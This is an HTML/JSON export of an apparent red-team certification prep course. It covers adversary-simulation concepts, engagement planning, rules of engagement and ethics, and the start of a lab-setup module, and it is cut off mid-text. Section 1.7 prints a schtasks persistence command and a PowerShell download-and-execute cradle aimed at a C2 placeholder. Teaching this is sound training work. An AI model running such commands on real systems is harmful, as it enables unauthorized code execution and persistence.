xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-7\" data-view=\"module-7\" data-module-order=\"7\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 7: module_7</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_7 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-8\" data-view=\"module-8\" data-module-order=\"8\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 8: module_8</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_8 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        </ul> <!-- Include the module list for Overview -->\n        </div>\n    ",
  "modules": {
    "module-1": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 1: module_1</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, settle in! It&#39;s awesome to see everyone ready to dive into the foundational stuff. Module 1 isn&#39;t about slinging commands just yet; it&#39;s about building the <em>brain</em> behind the operation. We&#39;re going to understand <em>why</em> we do what we do, <em>who</em> we&#39;re trying to simulate, and <em>how</em> to structure our efforts so they&#39;re effective, safe, and legal. This mindset shift is non-negotiable for moving beyond simple vulnerability scanning and into the world of realistic adversary simulation.</p>\n<p>Think of it like this: You wouldn&#39;t start building a complex RF circuit without understanding the principles of electromagnetism, or write advanced AI without understanding the underlying math. Similarly, we won&#39;t jump into C2 and payloads without understanding the <em>planning</em> and <em>purpose</em> that drives a real adversary simulation.</p>\n<p>Let&#39;s get started on building that crucial foundation!</p>\n<hr>\n<h1>CRTO Prep Part 1: Adversary Simulation Foundations</h1>\n<h2>Module 1: The Adversary Simulation Mindset &amp; Planning</h2>\n<p><strong>Module Objective:</strong> By the end of this module, learners will be able to articulate the differences between Red Teaming, Penetration Testing, and Threat Emulation, understand the key phases of an adversary simulation engagement, and begin drafting an engagement plan based on threat intelligence.</p>\n<hr>\n<h3>Welcome to the Planning Room</h3>\n<p>This module is your introduction to the strategic side of offensive security. We&#39;re putting on our attacker hats, but first, we need to think like military strategists. Planning is paramount. A well-planned simulation is effective, stays within bounds, and provides maximum value to the client (or yourself, in a lab setting).</p>\n<h3>Essential Subtopics: Deep Dive</h3>\n<p>Let&#39;s break down each key concept we need to master in this module.</p>\n<h4>1.1 Defining Red Teaming vs. Penetration Testing vs. Threat Emulation</h4>\n<p>This is often confusing, so let&#39;s draw a clear line. They all involve offensive techniques, but their <em>goals</em>, <em>scope</em>, and <em>methodologies</em> differ significantly.</p>\n<ul>\n<li><p><strong>Penetration Testing (PT):</strong></p>\n<ul>\n<li><strong>Goal:</strong> Find <em>as many vulnerabilities as possible</em> within a defined scope. Think comprehensive vulnerability identification and exploitation.</li>\n<li><strong>Scope:</strong> Typically narrow and well-defined (e.g., specific applications, IP ranges, network segments). Often focuses on known weaknesses (N-day vulns) or misconfigurations.</li>\n<li><strong>Methodology:</strong> Often follows a structured, repeatable process (like OWASP for web apps, NIST guides). Can involve automated scanning alongside manual testing. Speed and breadth over stealth.</li>\n<li><strong>Outcome:</strong> A report listing identified vulnerabilities, their severity, impact, and recommended remediation steps.</li>\n<li><strong>Analogy:</strong> A building inspector looking for structural faults, electrical hazards, plumbing leaks, etc., in specific areas.</li>\n</ul>\n</li>\n<li><p><strong>Red Teaming (RT):</strong></p>\n<ul>\n<li><strong>Goal:</strong> Test the <em>detection and response capabilities</em> of the organization (the &quot;Blue Team&quot;). Simulate a <em>realistic</em> adversary&#39;s attempt to achieve specific, high-value objectives. It&#39;s about measuring the effectiveness of the security program as a whole, not just finding technical bugs.</li>\n<li><strong>Scope:</strong> Broader than PT, often simulating paths to critical assets or &quot;crown jewels&quot; (e.g., domain controllers, sensitive databases, critical business systems). Focuses on getting <em>in</em> and moving <em>laterally</em> while avoiding detection.</li>\n<li><strong>Methodology:</strong> Emulates realistic adversary Tactics, Techniques, and Procedures (TTPs). Highly manual and stealth-focused. May use novel techniques (0-days, custom malware) if simulating advanced threats, but often relies on blending in using common techniques. Success is measured by achieving objectives and the <em>defender&#39;s response</em>.</li>\n<li><strong>Outcome:</strong> A report detailing how objectives were achieved, which actions were detected (and how quickly/effectively), which were missed, and recommendations for improving detection, response, and prevention strategies.</li>\n<li><strong>Analogy:</strong> A simulated break-in by skilled thieves trying to steal specific valuable items, testing the alarms, guards, cameras, and police response.</li>\n</ul>\n</li>\n<li><p><strong>Threat Emulation (TE):</strong></p>\n<ul>\n<li><strong>Goal:</strong> Simulate the specific TTPs of a <em>known, identified threat actor</em> (e.g., APT29, FIN7). Test defenses against a specific, relevant adversary profile.</li>\n<li><strong>Scope:</strong> Defined by the observed activities and targets of the specific threat actor being emulated.</li>\n<li><strong>Methodology:</strong> Strictly follows the documented TTPs of the chosen threat actor. This requires detailed threat intelligence. It&#39;s a <em>subset</em> of Red Teaming focused on fidelity to a specific adversary.</li>\n<li><strong>Outcome:</strong> A report assessing how well the organization&#39;s defenses performed against the specific TTPs of the emulated threat actor, highlighting gaps relevant to that adversary.</li>\n<li><strong>Analogy:</strong> Role-playing as a specific, known criminal gang with their documented methods and targets to see if the security system can stop <em>that particular group</em>.</li>\n</ul>\n</li>\n</ul>\n<p><strong>How this relates to CRTO:</strong> The CRTO exam, and this course, sit firmly in the <strong>Red Teaming</strong> and <strong>Threat Emulation</strong> space. We&#39;re learning to think and operate like adversaries – focusing on achieving objectives, moving stealthily, using common TTPs (LOLBAS, standard persistence), and understanding how our actions look from a defender&#39;s perspective (logging, monitoring). We&#39;re not just finding vulns; we&#39;re simulating the <em>chain</em> of events an attacker would use.</p>\n<h4>1.2 Why Adversary Simulation? Understanding the Value Proposition</h4>\n<p>Okay, so why bother with this complex simulation stuff when you could just run Nessus or Qualys?</p>\n<ul>\n<li><strong>Tests the Entire Security Program:</strong> PT finds technical flaws. AdvSim tests <em>people, process, and technology</em> together. Can the SOC detect sophisticated phishing? Can the IR team respond effectively to a lateral movement attempt?</li>\n<li><strong>Measures Real Risk:</strong> Does a vulnerability <em>actually</em> matter if the Blue Team catches the attacker trying to exploit it immediately? Can an attacker <em>chain</em> seemingly low-risk issues to achieve a high-impact objective? AdvSim answers these questions.</li>\n<li><strong>Validates Security Investments:</strong> Did that expensive new EDR or threat intelligence feed make a difference? AdvSim provides concrete evidence of effectiveness (or lack thereof).</li>\n<li><strong>Trains the Blue Team:</strong> A well-executed simulation is a high-fidelity training exercise for defenders, showing them what real attacks look like in their environment.</li>\n<li><strong>Prioritizes Remediation:</strong> Instead of a flat list of vulns, AdvSim highlights the paths an attacker <em>can</em> take to hit critical assets, helping the organization focus remediation efforts where they matter most.</li>\n</ul>\n<p>In short, adversary simulation provides a <em>realistic</em> assessment of an organization&#39;s defensive posture against determined human attackers, which is something automated tools and traditional PT often miss.</p>\n<h4>1.3 Key Phases of an Adversary Simulation Engagement</h4>\n<p>While methodologies vary (like the Cyber Kill Chain or unified kill chain), a typical adversary simulation follows a logical flow, mirroring real-world attacks. Understanding these phases helps structure our planning and execution.</p>\n<ol>\n<li><p><strong>Intelligence Gathering (Reconnaissance):</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Learn about the target environment, find potential entry points, identify key personnel or systems, understand defenses.</li>\n<li><strong>Simulation Action:</strong> Passive and active reconnaissance (OSINT, network scanning, identifying technologies, finding credentials/leaks). This informs subsequent phases.</li>\n<li><em>Think:</em> What information would a real attacker gather before attacking <em>this specific</em> target?</li>\n</ul>\n</li>\n<li><p><strong>Infrastructure:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Set up the command and control (C2) and delivery infrastructure needed for the operation.</li>\n<li><strong>Simulation Action:</strong> Deploying servers, configuring redirectors, setting up domains/IPs, choosing C2 frameworks. OpSec is critical here.</li>\n<li><em>Think:</em> How will our implants communicate? How will we deliver payloads? How do we hide our tracks? (This is a major focus of Modules 2 &amp; 3!)</li>\n</ul>\n</li>\n<li><p><strong>Initial Access:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Get the first foothold inside the target network.</li>\n<li><strong>Simulation Action:</strong> Executing the chosen initial access vector (phishing, exploiting a perimeter vulnerability, physical access, supply chain).</li>\n<li><em>Think:</em> How do we get our code to run on a machine inside the network? (Module 4 &amp; 5!)</li>\n</ul>\n</li>\n<li><p><strong>Execution:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Run malicious code on the target system.</li>\n<li><strong>Simulation Action:</strong> Using techniques like LOLBAS, scripting, malicious documents, etc., to execute the payload delivered during Initial Access.</li>\n<li><em>Think:</em> How do we run our implant or code without being caught? (Module 5 &amp; 6!)</li>\n</ul>\n</li>\n<li><p><strong>Persistence:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Maintain access to the compromised system even after reboots, patching, or credential changes.</li>\n<li><strong>Simulation Action:</strong> Implementing mechanisms like scheduled tasks, registry run keys, services, etc., to ensure the implant restarts or can be easily re-executed.</li>\n<li><em>Think:</em> How do we make sure we don&#39;t lose access once we&#39;re in? (Module 8!)</li>\n</ul>\n</li>\n<li><p><strong>Lateral Movement:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Move from the initial compromised system to other systems within the network to reach objectives.</li>\n<li><strong>Simulation Action:</strong> Using techniques like Pass-the-Hash/Ticket, exploiting services, abusing administrative tools (PsExec, WinRM), RDP, etc.</li>\n<li><em>Think:</em> We&#39;re on one machine, how do we get to the Domain Controller or the Finance server?</li>\n</ul>\n</li>\n<li><p><strong>Collection:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Gather sensitive data relevant to the objectives from compromised systems.</li>\n<li><strong>Simulation Action:</strong> Locating files, dumping credentials, accessing databases, taking screenshots, keylogging.</li>\n<li><em>Think:</em> Where is the data we need? How do we get it?</li>\n</ul>\n</li>\n<li><p><strong>Exfiltration:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Get the collected data out of the target network without detection.</li>\n<li><strong>Simulation Action:</strong> Using various protocols (HTTP/S, DNS, FTP), encrypted channels, or trusted third-party services to transfer data out.</li>\n<li><em>Think:</em> We have the data, how do we sneak it out?</li>\n</ul>\n</li>\n<li><p><strong>Impact (Optional/Simulated):</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Achieve the final, high-impact objective (e.g., deploy ransomware, disrupt operations, modify critical data).</li>\n<li><strong>Simulation Action:</strong> Often <em>simulated</em> in RT/TE (e.g., placing a &quot;flag&quot; file, demonstrating the <em>ability</em> to encrypt files without actually doing it). <em>Never</em> perform actual destructive actions without explicit, <em>extremely</em> rare permission.</li>\n<li><em>Think:</em> How would a real attacker achieve their ultimate goal? Can we demonstrate that capability safely?</li>\n</ul>\n</li>\n<li><p><strong>Clean-up:</strong></p>\n<ul>\n<li><strong>Adversary Goal:</strong> Remove tools, logs, and persistence mechanisms to hinder detection and incident response.</li>\n<li><strong>Simulation Action:</strong> Deleting files, clearing logs (carefully, as this is often a detection opportunity for Blue Team), removing persistence.</li>\n<li><em>Think:</em> How do we cover our tracks?</li>\n</ul>\n</li>\n</ol>\n<p><strong>Mapping to this Course:</strong> This &quot;Adversary Simulation Foundations&quot; part of the CRTO prep focuses heavily on phases <strong>1 (Planning informed by Intel), 2 (Infrastructure), 3 (Initial Access), 4 (Execution), 5 (Persistence),</strong> and introduces concepts relevant to <strong>6 (Lateral Movement - execution methods)</strong> and <strong>7 (Collection - execution methods)</strong> through the lens of initial compromise techniques. We&#39;ll build the capability to execute these early phases effectively and stealthily.</p>\n<h4>1.4 Engagement Design: Setting Realistic Objectives (Flags) and Scope</h4>\n<p>Before touching <em>any</em> keyboard for offensive actions, you <em>must</em> define:</p>\n<ul>\n<li><p><strong>Objectives (&quot;Flags&quot;):</strong> What are the concrete goals of the simulation? These should be challenging but achievable within the scope and timeframe. Examples:</p>\n<ul>\n<li>Obtain Domain Administrator credentials.</li>\n<li>Access a specific sensitive database server.</li>\n<li>Simulate the exfiltration of a dummy &quot;confidential&quot; file from a particular file share.</li>\n<li>Establish persistence on at least 3 workstations.</li>\n<li>These flags define success and guide your TTP selection.</li>\n</ul>\n</li>\n<li><p><strong>Scope:</strong> This defines the playing field.</p>\n<ul>\n<li><strong>In-Scope:</strong> What systems, IP ranges, applications, user groups are valid targets? Be specific.</li>\n<li><strong>Out-of-Scope:</strong> What is absolutely off-limits? Production systems, critical infrastructure, executives&#39; personal devices, specific user accounts, <em>any</em> activity that could cause disruption (unless explicitly agreed upon - <em>highly</em> rare).</li>\n<li><strong>Allowed Activities:</strong> Phishing? Physical access? Social engineering? Network scanning?</li>\n<li><strong>Disallowed Activities:</strong> Denial of Service (DoS)? Any activity causing system instability? Accessing specific sensitive data (like real PII)?</li>\n<li>Defining scope protects <em>you</em> and the <em>client</em>. Violating scope is a surefire way to end an engagement (and potentially your career).</li>\n</ul>\n</li>\n</ul>\n<h4>1.5 Rules of Engagement (ROE): Defining Boundaries and &quot;Get Out of Jail Free&quot; cards</h4>\n<p>The ROE is the formal contract outlining the terms of the simulation. It&#39;s legally binding and your ultimate protection. Key elements:</p>\n<ul>\n<li><strong>Dates and Times:</strong> When does the test start and end? Are there specific windows for certain activities (e.g., no phishing on weekends)?</li>\n<li><strong>Scope (reiterated):</strong> Formal documentation of in/out scope.</li>\n<li><strong>Communication Channels:</strong> How will the Red Team and Blue Team/Point of Contact (POC) communicate? (e.g., dedicated chat, phone numbers). Who is the primary POC?</li>\n<li><strong>Emergency Contact / &quot;Get Out of Jail Free&quot; (GOJFF):</strong> A clear procedure and contact person/number to immediately stop the test if something goes wrong (e.g., you hit a production system, cause unexpected disruption, or the Blue Team detects and responds in a way that requires communication). <em>This is critical for safety.</em></li>\n<li><strong>Whitecarding:</strong> Sometimes, specific Red Team IPs or activities are &quot;whitecarded&quot; or ignored by certain security tools or teams to allow testing of <em>other</em> layers. The ROE defines this.</li>\n<li><strong>Legal &amp; Ethical Clauses:</strong> Confirmation of permission, data handling requirements, non-disclosure agreements.</li>\n</ul>\n<p><strong>In our lab:</strong> While we don&#39;t have a formal client ROE, we <em>will</em> define our own &quot;lab ROE.&quot; What are the target systems? What are the flags we want to capture? What activities are we simulating (e.g., no actual data exfiltration, just simulate capability)? This self-discipline is crucial.</p>\n<h4>1.6 Threat Actor Profiling: Using MITRE ATT&amp;CK, OSINT, and Incident Reports to Understand TTPs</h4>\n<p>This is where we get specific about <em>who</em> we&#39;re simulating. Even if not emulating a <em>specific</em> named group, understanding common attacker behaviors makes our simulation realistic.</p>\n<ul>\n<li><p><strong>MITRE ATT&amp;CK:</strong> This is your bible for understanding adversary behavior.</p>\n<ul>\n<li>It organizes TTPs into <strong>Tactics</strong> (the <em>why</em> - e.g., Persistence, Lateral Movement, Exfiltration) and <strong>Techniques</strong> (the <em>how</em> - e.g., T1053 - Scheduled Task, T1059 - Command and Scripting Interpreter).</li>\n<li>Techniques often have <strong>Sub-techniques</strong> (e.g., T1059.001 - PowerShell, T1059.003 - Windows Command Shell).</li>\n<li>It also lists <strong>Groups</strong> (specific threat actors) and <strong>Software</strong> they use, often linking them to specific Techniques.</li>\n<li><strong>How to Use It:</strong> Browse the matrix, read the descriptions for techniques relevant to the phases you&#39;re simulating (Initial Access, Execution, Persistence are key for this course). Look at the &quot;Detection&quot; and &quot;Mitigation&quot; sections for each technique – this informs how the Blue Team might see you and how you might evade them. Look at the &quot;Procedure Examples&quot; to see how tools or commands implement the technique.</li>\n</ul>\n</li>\n<li><p><strong>OSINT &amp; Incident Reports:</strong> Real-world breaches documented by security researchers, government agencies, or news outlets provide invaluable insights into current attacker TTPs.</p>\n<ul>\n<li>Look for reports from CISA, Mandiant, CrowdStrike, Microsoft Threat Intelligence, etc.</li>\n<li>Pay attention to the <em>initial access vector</em>, the <em>tools</em> they used, the <em>persistence methods</em>, and <em>how</em> they moved laterally.</li>\n<li><strong>Example:</strong> A report on a ransomware group might detail they gained initial access via a vulnerable RDP server (T1021.007), executed a PowerShell stager (T1059.001), established persistence via a Run key (T1547.001), and used PsExec (T1021.006) for lateral movement.</li>\n</ul>\n</li>\n</ul>\n<h4>1.7 Translating TTPs into Simulation Actions</h4>\n<p>This is the critical step that bridges planning to execution. You take the TTPs identified through threat intelligence and map them to concrete actions in your simulation.</p>\n<ul>\n<li><p><strong>Example TTP (from ATT&amp;CK):</strong> T1053.005 - Scheduled Task</p>\n<ul>\n<li><strong>Description:</strong> Adversaries may abuse the Windows Task Scheduler to execute programs at startup or at scheduled intervals.</li>\n<li><strong>Procedure Examples:</strong> <code>schtasks.exe /create /tn &quot;MyTask&quot; /tr &quot;C:\\Path\\To\\My\\Payload.exe&quot; /sc ONLOGON /RL HIGHEST</code>, using PowerShell <code>Register-ScheduledTask</code>.</li>\n<li><strong>Simulation Action:</strong> In Module 8, we will <em>literally</em> use <code>schtasks.exe</code> or PowerShell to create a task on our target VM that executes our implant, simulating this exact TTP.</li>\n</ul>\n</li>\n<li><p><strong>Example TTP:</strong> T1059.001 - PowerShell</p>\n<ul>\n<li><strong>Description:</strong> Adversaries may abuse PowerShell commands and scripts for execution.</li>\n<li><strong>Procedure Examples:</strong> <code>powershell.exe -c &quot;[Net.WebClient]::new().DownloadString(&#39;http://&lt;C2_SERVER&gt;/script.ps1&#39;) | IEX&quot;</code>.</li>\n<li><strong>Simulation Action:</strong> In Module 5, we will use <code>powershell.exe</code> on the target VM to download and execute a script hosted on our C2 infrastructure, simulating this TTP.</li>\n</ul>\n</li>\n</ul>\n<p>This translation is key. ATT&amp;CK and threat reports tell you <em>what</em> attackers do. Your technical skills (coding, scripting, using tools) and this course teach you <em>how</em> to do it in a controlled environment.</p>\n<h4>1.8 Legal and Ethical Considerations in Adversary Simulation</h4>\n<p>This is non-negotiable and paramount.</p>\n<ul>\n<li><strong>Always Have Permission:</strong> Never, <em>ever</em> perform offensive activities on systems you do not explicitly have written permission to test. In a lab environment, <em>you</em> are granting yourself permission on systems you own or control.</li>\n<li><strong>Stay in Scope:</strong> Adhere strictly to the defined scope and disallowed activities in the ROE (or your lab plan).</li>\n<li><strong>Understand Data Handling:</strong> If you access any real data (especially PII/PHI/PCI), know the rules for handling it. Ideally, avoid accessing or exfiltrating real sensitive data in simulations unless absolutely necessary and explicitly permitted with strict controls.</li>\n<li><strong>Minimize Disruption:</strong> Adversary simulation aims to be realistic but should avoid causing actual harm or significant disruption to business operations. This is where the GOJFF and careful planning come in.</li>\n<li><strong>Be Prepared to Stop:</strong> If the GOJFF criteria are met, stop immediately and follow the communication protocol.</li>\n<li><strong>Understand Local Laws:</strong> Be aware of cybercrime laws in your jurisdiction and the target&#39;s jurisdiction.</li>\n</ul>\n<p><strong>In our lab:</strong> We control the environment, which simplifies things immensely. However, the discipline of defining scope, objectives, and &quot;rules&quot; (like not attacking systems outside our lab network) is a habit you <em>must</em> build.</p>\n<hr>\n<h3>Suggested Resources or Prerequisites</h3>\n<p>To get the most out of this module:</p>\n<ul>\n<li><p><strong>Basic Cybersecurity Concepts:</strong> You should know what a vulnerability, exploit, malware, firewall, and antivirus are at a high level.</p>\n</li>\n<li><p><strong>Cyber Kill Chain or MITRE ATT&amp;CK:</strong> We&#39;ve introduced ATT&amp;CK here, but spend some time exploring it. It&#39;s fundamental.</p>\n</li>\n<li><p><strong>Reading:</strong> If you have access, books like &quot;Red Team Operations&quot; by Joe Vest and Kirk Hayes are excellent foundational texts. Even just reading the introductions and planning chapters is valuable.</p>\n</li>\n<li><p><strong>Online:</strong></p>\n<ul>\n<li><strong>MITRE ATT&amp;CK Website:</strong> Go explore it! <code>attack.mitre.org</code>. Click around, read technique descriptions, look at groups.</li>\n<li><strong>LOLBAS Project:</strong> <code>lolbas-project.github.io</code>. This catalog of Living Off The Land Binaries and Scripts is incredibly useful for finding execution and defense evasion techniques.</li>\n<li><strong>OSINT Sources:</strong> Follow cybersecurity news, read breach analyses from reputable firms.</li>\n</ul>\n</li>\n<li><p><strong>Case Study:</strong> Let&#39;s quickly analyze a case study to tie this together.</p>\n</li>\n</ul>\n<h4>Case Study Analysis: Initial Access &amp; Infrastructure in Major Breaches</h4>\n<p>Consider the SolarWinds breach (often attributed to APT29/Cozy Bear) or the Colonial Pipeline ransomware attack (DarkSide).</p>\n<ul>\n<li><p><strong>SolarWinds:</strong></p>\n<ul>\n<li><strong>Initial Access:</strong> Supply Chain Compromise (T1195.002). Malicious code injected into a legitimate software update (SolarWinds Orion). This is a highly sophisticated technique.</li>\n<li><strong>Execution:</strong> The malicious update deployed a backdoor (SUNBURST). This backdoor then executed further code (T1059) and communicated with C2 infrastructure (T1071.001 - Web Protocols).</li>\n<li><strong>Infrastructure:</strong> The C2 infrastructure used techniques like Domain Fronting (T1090.004 - conceptual link) and blended in with legitimate SolarWinds update traffic. They used compromised infrastructure and cloud services.</li>\n<li><strong>Simulation Relevance:</strong> While simulating a supply chain compromise is hard, we can simulate the <em>effects</em>: delivering a backdoor payload onto a system (like the Orion server) and having it communicate with our C2 using realistic protocols and potentially evasion techniques that mimic blending in (like using HTTPS, common user agents). We can then simulate the subsequent steps the attackers took <em>after</em> gaining that initial foothold.</li>\n</ul>\n</li>\n<li><p><strong>Colonial Pipeline (DarkSide):</strong></p>\n<ul>\n<li><strong>Initial Access:</strong> Reports suggest a compromised VPN credential (T1199 - Trusted Relationship, T1078 - Valid Accounts). A much simpler, common technique.</li>\n<li><strong>Execution:</strong> Once inside, they likely used standard tools and scripting (T1059) to execute ransomware payloads (Simulated Impact).</li>\n<li><strong>Infrastructure:</strong> Used standard C2 (likely HTTP/S) for initial access tools and separate infrastructure for ransomware communication/payment.</li>\n<li><strong>Simulation Relevance:</strong> Simulating compromised credentials for initial access is highly realistic and achievable in a lab (e.g., using default credentials, password spraying against a simulated VPN). We can then simulate the execution of a payload <em>after</em> authenticating, rather than just via unauthenticated exploit.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Discussion:</strong> How do these real-world examples inform our simulation planning? They show us <em>common vectors</em> (compromised credentials, supply chain, exploiting perimeter apps), <em>common execution methods</em> (scripting, LOLBAS), and the <em>importance of infrastructure</em> that blends in. When we draft our plan, we&#39;ll pick initial access vectors and TTPs that are relevant and achievable, perhaps inspired by these or other reports.</p>\n<hr>\n<h3>Module Project/Exercise</h3>\n<p>Time to put on our thinking caps and start building the foundation of our plan.</p>\n<h4>Exercise 1.1: Concept Mapping</h4>\n<p><strong>Objective:</strong> Clearly differentiate the core concepts of Penetration Testing, Red Teaming, and Threat Emulation.</p>\n<p><strong>Task:</strong> Create a diagram, table, or detailed written summary (your choice of format) that compares and contrasts Penetration Testing, Red Teaming, and Threat Emulation based on the following criteria:</p>\n<ol>\n<li><strong>Primary Goal:</strong> What is the main objective?</li>\n<li><strong>Scope:</strong> How is the scope typically defined?</li>\n<li><strong>Methodology:</strong> What are the typical approaches and priorities (e.g., breadth vs. depth, stealth vs. speed)?</li>\n<li><strong>Outcome/Report Focus:</strong> What is the main deliverable and its focus?</li>\n<li><strong>Analogy (Optional but Recommended):</strong> Use a non-cyber analogy to explain the difference.</li>\n</ol>\n<p><strong>Why this is important:</strong> Having a crystal-clear understanding of these terms is fundamental. You&#39;ll see them used (and sometimes misused) constantly in the industry. For CRTO, knowing you&#39;re operating in the &quot;Red Team/Threat Emulation&quot; mindset guides your approach.</p>\n<h4>Project 1.2: Basic Engagement Plan Draft</h4>\n<p><strong>Objective:</strong> Begin the process of planning an adversary simulation by drafting the initial sections of an engagement plan based on a hypothetical scenario and threat intelligence.</p>\n<p><strong>Hypothetical Scenario:</strong> You are tasked with simulating a threat actor group (let&#39;s call them &quot;APT-LabRat&quot;) targeting a small, internal corporate network. APT-LabRat is known for gaining initial access primarily through phishing emails containing malicious attachments (like weaponized documents or HTA files) and establishing persistence using standard Windows features like Scheduled Tasks or Run keys. Their objective is typically to gain access to administrative credentials.</p>\n<p><strong>Task:</strong> Draft a <em>high-level</em> engagement plan outline based on this scenario, including the following sections:</p>\n<ol>\n<li><strong>Engagement Objective(s):</strong> What is the main goal(s) for <em>your</em> simulation based on the scenario? (e.g., &quot;Obtain credentials for a Domain Administrator account in the lab domain&quot;). Define at least one clear objective.</li>\n<li><strong>In-Scope Assets (Conceptual):</strong> Based on the scenario (small internal network), what <em>types</em> of assets are you targeting? (e.g., user workstations, a domain controller, maybe a file server). You don&#39;t need specific IPs yet, just roles.</li>\n<li><strong>Out-of-Scope Activities:</strong> What activities are you explicitly <em>not</em> going to perform in this lab simulation? (e.g., actual data theft, causing disruption, attacking systems outside the lab network).</li>\n<li>**Key T</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-2": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 2: module_2</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, let&#39;s dive deep into the engine room! Module 1 set the stage, giving us the <em>why</em> and the <em>what</em> of adversary simulation. Now, in Module 2, we build the <em>where</em>. This isn&#39;t just setting up some virtual machines; this is constructing our own little world, a safe sandbox where we can unleash simulated threats and, critically, <em>observe</em> how they behave and how defenses react. Think of this lab as your personal training ground, your dojo for detection and response analysis from the attacker&#39;s perspective. We&#39;re building the foundation that the rest of the course stands on. Let&#39;s get our hands dirty!</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<h3>Module 2: Building Your Adversary Simulation Lab</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to deploy and configure a hybrid lab environment including Active Directory, target workstations, and foundational monitoring tools necessary to observe adversary simulation activities.</li>\n</ul>\n<hr>\n<p>Welcome back! Before we can simulate adversaries, we need a place to do it safely and effectively. This module is dedicated to setting up a controlled environment that mirrors typical enterprise networks, allowing us to practice techniques and, crucially, see how they look to defenders.</p>\n<h4>2.1 Lab Environment Design: Why a Lab is Crucial</h4>\n<p>Why bother building a dedicated lab?</p>\n<ul>\n<li><strong>Safety:</strong> You absolutely <em>never</em> want to practice offensive techniques on production systems (unless explicitly authorized in a scope). A lab provides a contained space.</li>\n<li><strong>Control:</strong> You control every aspect of the environment – the operating systems, the network configuration, the security tools (or lack thereof). This allows for focused testing.</li>\n<li><strong>Visibility:</strong> By controlling the environment, you can deploy and configure logging and monitoring tools to gain deep insight into <em>exactly</em> what happens when you execute a technique. This is paramount for understanding detection.</li>\n<li><strong>Repeatability:</strong> You can snapshot your environment, revert to a clean state, and repeat tests endlessly.</li>\n</ul>\n<p><strong>Choosing Your Platform:</strong></p>\n<p>You have options for hosting your virtual lab. The most common are:</p>\n<ul>\n<li><strong>VMware Workstation Pro/Fusion:</strong> Excellent performance, features like linked clones and snapshots are robust. Requires a license.</li>\n<li><strong>VirtualBox:</strong> Free and open-source. Good for basic setups, snapshots work well. Performance can sometimes be less than VMware.</li>\n<li><strong>Hyper-V:</strong> Built into Windows Pro/Enterprise/Server. Native, good performance. Management interface can be less intuitive for beginners compared to VMware/VirtualBox GUIs.</li>\n<li><strong>Cloud (Azure, AWS, GCP):</strong> Offers scalability and access to different OS images easily. Can be more complex to set up internal networking and AD initially, and cost needs careful management (though free tiers exist). Provides experience with cloud environments, which is valuable.</li>\n</ul>\n<p>For this foundational lab, we&#39;ll primarily focus on a <strong>local lab</strong> using a hypervisor like VMware or VirtualBox, as it&#39;s the most accessible and cost-effective way to get started. We&#39;ll touch on hybrid concepts later.</p>\n<p><strong>Minimum Lab Components:</strong></p>\n<p>To simulate an enterprise environment and observe activities, you need at least:</p>\n<ol>\n<li><strong>Domain Controller (DC):</strong> A Windows Server VM acting as the heart of your Active Directory domain. This provides authentication, DNS, and central management.</li>\n<li><strong>Target Workstation(s):</strong> One or more Windows Client VMs (Windows 10/11) joined to the domain. These are where you&#39;ll execute payloads and practice techniques.</li>\n<li><strong>Attacker Machine:</strong> A VM (Kali Linux, Commando VM, or even just a Windows VM with necessary 